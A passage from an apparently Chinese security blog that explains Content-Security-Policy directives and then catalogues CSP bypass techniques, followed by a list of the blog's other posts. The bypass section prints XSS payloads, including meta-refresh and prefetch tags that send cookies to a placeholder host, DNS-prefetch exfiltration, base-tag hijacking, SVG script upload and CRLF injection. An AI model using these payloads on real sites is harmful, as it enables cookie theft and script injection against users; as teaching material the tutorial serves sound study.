class="line">plugin-types	//限制可以使用的插件格式</span><br><span class="line">referrer</span><br><span class="line">report-to</span><br><span class="line">report-uri</span><br><span class="line">require-sri-for</span><br><span class="line">sandbox	//浏览器行为的限制，比如不能有弹出窗口等</span><br><span class="line">script-src-elem</span><br><span class="line">style-src-elem</span><br><span class="line">trusted-types</span><br><span class="line">upgrade-insecure-requests	//自动将网页上所有加载外部资源的 HTTP 链接换成 HTTPS 协议</span><br></pre></td></tr></table></figure>
<p>常见选项值：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">主机名：example.org，https://example.com:443</span><br><span class="line">路径名：example.org/resources/js/</span><br><span class="line">通配符：*.example.org，*://*.example.com:*（表示任意协议、任意子域名、任意端口）</span><br><span class="line">协议名：https:、data:</span><br><span class="line">关键字&apos;self&apos;：当前域名，需要加引号</span><br><span class="line">关键字&apos;none&apos;：禁止加载任何外部资源，需要加引号</span><br></pre></td></tr></table></figure>
<p>多个值可以并列，用空格分隔</p>
<p>外部脚本只能从 <a href="https://example.com" target="_blank" rel="noopener">https://example.com</a> 域中加载，而 default-src 则限制其他资源只从自身加载</p>
<p><code>script-src</code> 的特殊值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&apos;unsafe-inline&apos;：允许执行页面内嵌的&lt;script&gt;标签和事件监听函数</span><br><span class="line">unsafe-eval：允许将字符串当作代码执行，比如使用eval、setTimeout、setInterval和Function等函数。</span><br><span class="line">nonce值：每次HTTP回应给出一个授权token，页面内嵌脚本必须有这个token，才会执行</span><br><span class="line">hash值：列出允许执行的脚本代码的Hash值，页面内嵌脚本的哈希值只有吻合的情况下，才能执行。</span><br></pre></td></tr></table></figure>
<p>如</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;self&apos;; script-src https://example.com</span><br><span class="line"></span><br><span class="line">执行有 token 的脚本</span><br><span class="line">&lt;script nonce=EDNnf03nceIOfn39fn3e9h3sdfa&gt;</span><br><span class="line">  // some code</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Content-Security-Policy: script-src &apos;sha256-qznLcsROx4GACP2dm0UCKCzCG-HiZ1guq6ZZDob_Tng=&apos;</span><br><span class="line"></span><br><span class="line">以下除 &lt;script&gt; 标签外的代码 hash 值等于设置值，所以会执行 </span><br><span class="line">&lt;script&gt;alert(&apos;Hello, world.&apos;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>更多参数信息可以到 MDN Docs 查看 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/" target="_blank" rel="noopener">Content-Security-Policy - HTTP | MDN</a></p>
<h2 id="0x02-CSP-Bypass"><a href="#0x02-CSP-Bypass" class="headerlink" title="0x02 CSP Bypass"></a>0x02 CSP Bypass</h2><h3 id="1-URL-跳转"><a href="#1-URL-跳转" class="headerlink" title="1. URL 跳转"></a>1. URL 跳转</h3><h4 id="default-src-‘none’-时"><a href="#default-src-‘none’-时" class="headerlink" title="default-src ‘none’ 时"></a>default-src ‘none’ 时</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"refresh"</span> <span class="attr">content</span>=<span class="string">"1;url=http://www.xss.com/x.php?c=[cookie]"</span> &gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="script-src-‘unsafe-inline’-时"><a href="#script-src-‘unsafe-inline’-时" class="headerlink" title="script-src ‘unsafe-inline’ 时"></a>script-src ‘unsafe-inline’ 时</h4><p>一些常用 javascript 重定向跳转方法</p>
<p>window.location</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">window.location="http://eval.php?c=cookie"</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>window.location.href</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"> </span></span><br><span class="line"><span class="undefined">window.location.href="http://baidu.com"; </span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>window.location.replace</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">window.location.replace("http://baidu.com")</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>window.open // Chrome 和 FireFox 默认会拦截弹出窗口</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">window.open("http://baidu.com")</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>self.location</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"> </span></span><br><span class="line"><span class="undefined">self.location='http://baidu.com'; </span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>top.location</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"> </span></span><br><span class="line"><span class="undefined">top.location='http://baidu.com'; </span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>有个 window.navigate 只针对 IE，所以不推荐</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">document.location="http://baidu.com"</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">location.href="http://baidu.com"</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p> img、video、audio、iframe、a 等标签的 src 或 href 发起外域请求</p>
<h4 id="script-src-‘unsafe-eval’-时"><a href="#script-src-‘unsafe-eval’-时" class="headerlink" title="script-src ‘unsafe-eval’ 时"></a>script-src ‘unsafe-eval’ 时</h4><p>使用 eval 函数，结合 fromCharCode 可以 Bypass 一些常见过滤</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">// c = 'document.location="http://baidu.com"'</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"> </span></span><br><span class="line"><span class="undefined">eval(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 108, 111, 99, 97, 116, 105, 111, 110, 61, 34, 104, 116, 116, 112, 58, 47, 47, 98, 97, 105, 100, 117, 46, 99, 111, 109, 34))</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="标签预加载"><a href="#标签预加载" class="headerlink" title="标签预加载"></a>标签预加载</h3><h4 id="1-dns-prefetch"><a href="#1-dns-prefetch" class="headerlink" title="1. dns-prefetch"></a>1. dns-prefetch</h4><p>dns-prefetch(DNS预解析) 允许浏览器在后台提前将资源的域名转换为 IP 地址，当用户访问该资源时就可以加快 DNS 解析</p>
<p>在 <code>default-src &#39;self&#39;; script-src &#39;self&#39; &#39;unsafe-inline&#39;;</code> 时可以使用</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"dns-prefetch"</span> <span class="attr">href</span>=<span class="string">"//[some thing].xxxx.ceye.io"</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>但是测试 FireFox 好像不大行</p>
<p>注意替换域名的特殊字符满足域名的规则 <code>[.-a-zA-Z0-9]+</code></p>
<h4 id="2-prefetch"><a href="#2-prefetch" class="headerlink" title="2. prefetch"></a>2. prefetch</h4><p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Link_prefetching_FAQ" target="_blank" rel="noopener">Link Prefetch</a> (页面资源预加载)</p>
<blockquote>
<p>它利用浏览器的空闲时间来下载或预取用户可能在不久的将来访问的文档。<br>网页向浏览器提供一组预取提示，并且在浏览器完成页面加载后，它开始以静默方式预取指定的文档并将其存储在其缓存中</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"prefetch"</span> <span class="attr">href</span>=<span class="string">"http://www.xss.com/x.php?c=[cookie]"</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>但是本地测试新版 Chrome 和 FireFox 未成功</p>
<h3 id="标签补全"><a href="#标签补全" class="headerlink" title="标签补全"></a>标签补全</h3><p>比如使用 <code>Content-Security-Policy: default-src &#39;none&#39;;script-src &#39;nonce-abc&#39;</code>，当 nonce 相同才能执行脚本时</p>
<p>如果是类似下面情况</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>插入点<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">id</span>=<span class="string">"aa"</span> <span class="attr">nonce</span>=<span class="string">"abc"</span>&gt;</span><span class="undefined">document.write('CSP');</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>插入 <code>&lt;script src=//xxx x=&quot;</code>, 结果为</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">//xxx</span> <span class="attr">x</span>=<span class="string">"&lt;/p&gt;</span></span></span><br><span class="line"><span class="tag"><span class="string">&lt;script id="</span><span class="attr">aa</span>" <span class="attr">nonce</span>=<span class="string">"abc"</span>&gt;</span><span class="undefined">document.write('CSP');</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>虽然语法上提示有错误，但本地测试没有问题</p>
<p><img src="https://i.loli.net/2020/03/02/oQ4alNsyR5GSjx1.png" alt></p>
<p>xss 平台记录</p>
<p><img src="https://i.loli.net/2020/03/02/dQ92vSOPUqKNrW4.png" alt></p>
<h3 id="上传-JS-文件并引用"><a href="#上传-JS-文件并引用" class="headerlink" title="上传 JS 文件并引用"></a>上传 JS 文件并引用</h3><p><code>Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39;</code></p>
<p>像这种只能加载同域 script 的 CSP 策略，就得从其自身域内下功夫了, 也可以控制其域内某个主机</p>
<p>其实也不一定非得是正常的 js 文件，如果有上传点，将 js 代码放在文件中，即文件中的内容被作为 js 代码解析</p>
<h3 id="base-标签改变资源加载域"><a href="#base-标签改变资源加载域" class="headerlink" title="base 标签改变资源加载域"></a>base 标签改变资源加载域</h3><p>default-src 默认并不会设置 base-uri，所以当遇到设置了 default-src 却没有 base-uri 时可以使用 base 标签更改页面上下文，这时页面中使用相对路径的 script 就可以加载 base 标签地址中相应的内容</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'self'; script-src 'nonce-test'"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">"//my_ip/"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">'test'</span> <span class="attr">src</span>=<span class="string">"2.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>script 会请求 <code>my_ip/2.js</code></p>
<h3 id="代码重用"><a href="#代码重用" class="headerlink" title="代码重用"></a>代码重用</h3><p>就是利用 JS 库绕过 CSP </p>
<p>Blackhat 2017</p>
<p><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf" target="_blank" rel="noopener">Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf</a></p>
<h3 id="同源-iframe-绕过"><a href="#同源-iframe-绕过" class="headerlink" title="同源 iframe 绕过"></a>同源 iframe 绕过</h3><p>一个同源站点，存在多个页面，这时如果其中有一个页面没有 CSP 保护或者不严格而存在 XSS 漏洞，则可以使用 iframe 访问其他页面以绕过 CSP 限制</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"other csp page"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">var iframe = document.createElement('iframe');</span></span><br><span class="line"><span class="undefined">iframe.src="other csp page";</span></span><br><span class="line"><span class="undefined">document.body.appendChild(iframe);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="meta-标签"><a href="#meta-标签" class="headerlink" title="meta 标签"></a>meta 标签</h3><p>绕过 CSP nonce</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"cache-control"</span> <span class="attr">content</span>=<span class="string">"public"</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="svg-上传"><a href="#svg-上传" class="headerlink" title="svg 上传"></a>svg 上传</h3><p>如果能上传 svg 矢量图片的话，就可以使用 svg 进行 xss</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" standalone="no"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">version</span>=<span class="string">"1.1"</span> <span class="attr">id</span>=<span class="string">"Layer_1"</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">xmlns:xlink</span>=<span class="string">"http://www.w3.org/1999/xlink"</span> <span class="attr">x</span>=<span class="string">"0px"</span> <span class="attr">y</span>=<span class="string">"0px"</span> <span class="attr">width</span>=<span class="string">"100px"</span> <span class="attr">height</span>=<span class="string">"100px"</span> <span class="attr">viewBox</span>=<span class="string">"0 0 751 751"</span> <span class="attr">enable-background</span>=<span class="string">"new 0 0 751 751"</span> <span class="attr">xml:space</span>=<span class="string">"preserve"</span>&gt;</span>  <span class="tag">&lt;<span class="name">image</span> <span class="attr">id</span>=<span class="string">"image0"</span> <span class="attr">width</span>=<span class="string">"751"</span> <span class="attr">height</span>=<span class="string">"751"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"0"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">href</span>=<span class="string">"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAu8AAALvCAIAAABa4bwGAAAAIGNIUk0AAHomAACAhAAA+gAAAIDo"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="可控-JSONP-绕过"><a href="#可控-JSONP-绕过" class="headerlink" title="可控 JSONP 绕过"></a>可控 JSONP 绕过</h3><p>通过 JSONP 返回 js 数据，再借助 script 加载 js</p>
<p>举个栗子</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://ip/js.php?f"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>js.php 内容</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'Content-type: application/javascript'</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'f'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">        $src = <span class="string">'http://baidu.com'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'window.location="'</span>.$src.<span class="string">'"'</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>即可成功跳转，这种情况利用姿势很多，比如执行任意 js 函数等等</p>
<h3 id="object-src-绕过"><a href="#object-src-绕过" class="headerlink" title="object-src 绕过"></a>object-src 绕过</h3><p>object-src 用于设置插件，所以说，如果站点 CSP 设置没有 object-src 或值非 ‘none’ 则可以利用插件 js 执行弹窗或跳转操作</p>
<p>flash-xss 或者 pdf-xss</p>
<h3 id="缓存绕过-CSP-nonce"><a href="#缓存绕过-CSP-nonce" class="headerlink" title="缓存绕过 CSP nonce"></a>缓存绕过 CSP nonce</h3><p><a href="https://lorexxar.cn/2017/05/16/nonce-bypass-script/" target="_blank" rel="noopener">通过浏览器缓存来bypass CSP script nonce · LoRexxar&#39;s Blog</a></p>
<h3 id="CSS-选择器绕过-CSP"><a href="#CSS-选择器绕过-CSP" class="headerlink" title="CSS 选择器绕过 CSP"></a>CSS 选择器绕过 CSP</h3><p>CSS 选择器来读取页面内容，匹配到对应的属性，页面就会发出相应的请求</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*[attribute^="a"]&#123;background:url("record?match=a")&#125; </span><br><span class="line">*[attribute^="b"]&#123;background:url("record?match=b")&#125; </span><br><span class="line">*[attribute^="c"]&#123;background:url("record?match=c")&#125; [...]</span><br></pre></td></tr></table></figure>
<h3 id="CRLF"><a href="#CRLF" class="headerlink" title="CRLF"></a>CRLF</h3><p>通过 CRLF 可以注入 HTTP 头，也就可以注入 xss 代码</p>
<p>比如</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com/?url=%0d%0a%0d%0a<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(/xss/)</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>详细可以看  phithon 的文章 <a href="https://www.leavesongs.com/PENETRATION/Sina-CRLF-Injection.html" target="_blank" rel="noopener">CRLF Injection</a></p>
<h3 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h3><p>虽然 CSP 在很多时候并不能完全防御 XSS，但大多是因为配置不当等造成的，CSP 仍然有着它自身的价值，综合业务进行合理 CSP 配置并与其他技术结合才是正解</p>
<p>终极防护：全面禁止脚本</p>
<p>Reference:</p>
<p><a href="https://wulidecade.cn/2018/09/24/CSP-And-CSP-Bypass/" target="_blank" rel="noopener">https://wulidecade.cn/2018/09/24/CSP-And-CSP-Bypass/</a><br><a href="http://www.ruanyifeng.com/blog/2016/09/csp.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2016/09/csp.html</a><br><a href="https://xz.aliyun.com/t/5084" target="_blank" rel="noopener">https://xz.aliyun.com/t/5084</a></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/10/12/ThinkPHP_pop_v5.1.x/">ThinkPHP v5.1.x POP 链分析</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-10-12</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/ThinkPHP/">ThinkPHP</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/反序列化/">反序列化</a></span><div class="content"><p>文章首发于合天智汇：<a href="https://mp.weixin.qq.com/s/8dyuy-rW8-6isvHxmTI33A" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/8dyuy-rW8-6isvHxmTI33A</a></p></div><a class="more" href="/2019/10/12/ThinkPHP_pop_v5.1.x/#more">阅读更多</a><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/10/09/phpcmsv9.6.3_background_rce/">PHPCMS V9.6.3 后台一处 RCE</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-10-09</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/PHP/">PHP</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/代码审计/">代码审计</a></span><div class="content"><p>没想到这个洞撞了。。。</p></div><a class="more" href="/2019/10/09/phpcmsv9.6.3_background_rce/#more">阅读更多</a><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/09/10/js_prototype_pollution/">JavaScript 原型链污染 (Prototype Pollution) &amp;&amp; Hardjs 复现与分析</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-09-10</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/原型链污染/">原型链污染</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/JavaScript/">JavaScript</a></span><div class="content"><p>点击阅读</p></div><a class="more" href="/2019/09/10/js_prototype_pollution/#more">阅读更多</a><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/09/03/Intranet_Penetration/">记一次真实的内网渗透</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-09-03</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/渗透/">渗透</a></span><div class="content"><p>点击阅读</p></div><a class="more" href="/2019/09/03/Intranet_Penetration/#more">阅读更多</a><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/05/01/Metinfo612/">Metinfo 6.1.2 从 SQL 注入到 GetShell 复现&amp;分析</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-05-01</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/漏洞分析/">漏洞分析</a></span><div class="content"><p>点击阅读</p></div><a class="more" href="/2019/05/01/Metinfo612/#more">阅读更多</a><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/04/22/ddctf2019/">DDCTF 2019 WriteUp</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-04-22</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/CTF/">CTF</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/WriteUp/">WriteUp</a></span><div class="content"><p>点击阅读</p></div><a class="more" href="/2019/04/22/ddctf2019/#more">阅读更多</a><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/03/02/jwt-notes/">JSON Web Token（JWT）初探</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-03-02</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/JWT/">JWT</a></span><div class="content"><blockquote>
<p>JSON Web Token 是一个开放标准( RFC 7519 )，它定义了一种紧凑且独立的方式，以 JSON 对象的形式在各方之间安全地传输信息。</p>
</blockquote></div><a class="more" href="/2019/03/02/jwt-notes/#more">阅读更多</a><hr></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://i.loli.net/2020/02/01/sHdohVBU8nlmARP.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2017 - 2020 By J0k3r</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
